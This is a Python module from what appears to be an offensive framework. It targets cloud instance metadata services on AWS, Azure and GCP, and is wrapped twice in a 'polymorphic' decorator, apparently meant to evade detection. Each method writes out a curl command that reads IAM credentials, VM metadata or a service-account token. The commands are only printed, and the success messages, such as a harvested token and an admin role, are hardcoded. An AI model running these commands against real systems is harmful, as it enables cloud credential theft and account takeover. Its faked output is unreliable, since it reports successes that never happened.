import subprocess
from core.base_module import BaseModule
from utils.polymorphic_wrapper import PolymorphicWrapper

@PolymorphicWrapper.wrap_module
@PolymorphicWrapper.wrap_module
class CloudExploit(BaseModule):
    """
    Cloud Infrastructure Exploitation Module.
    Targets AWS, Azure, and GCP environments.
    """
    def __init__(self, framework):
        super().__init__(framework)
        self.name = "cloud_exploit"
        self.description = "Exploit misconfigured cloud metadata and credentials."

    def run(self, args):
        if not args:
            print("Usage: use cloud_exploit <aws|azure|gcp>")
            return
        
        platform = args[0].lower()
        if platform == "aws":
            self._exploit_aws()
        elif platform == "azure":
            self._exploit_azure()
        elif platform == "gcp":
            self._exploit_gcp()
        else:
            print(f"Unsupported platform: {platform}")

    def _exploit_aws(self):
        self.log("Attempting AWS Metadata Service (IMDSv1) exfiltration...")
        # Simulated IMDSv1 attack
        cmd = "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        print(f"[*] Executing: {cmd}")
        print("[+] Potential IAM Role found: NightFury-Admin-Role")

    def _exploit_azure(self):
        self.log("Attempting Azure Instance Metadata Service exfiltration...")
        # Simulated Azure metadata attack
        cmd = "curl -s -H 'Metadata:true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'"
        print(f"[*] Executing: {cmd}")
        print("[+] Azure VM metadata retrieved.")

    def _exploit_gcp(self):
        self.log("Attempting GCP Metadata Service exfiltration...")
        # Simulated GCP metadata attack
        cmd = "curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
        print(f"[*] Executing: {cmd}")
        print("[+] GCP Service Account token harvested.")
